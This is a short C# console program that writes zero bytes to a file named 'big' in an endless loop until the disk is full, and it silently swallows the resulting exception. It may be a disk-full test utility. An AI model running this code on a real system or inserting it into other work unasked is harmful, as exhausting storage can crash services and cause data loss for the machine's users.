namespace BigOne
{
	class Program
	{
		static void Main(string[] args)
		{
			try
			{
				using (var s = System.IO.File.OpenWrite("big"))
					while (true)
						s.WriteByte(0);
			}
			catch
			{ }
		}
	}
}
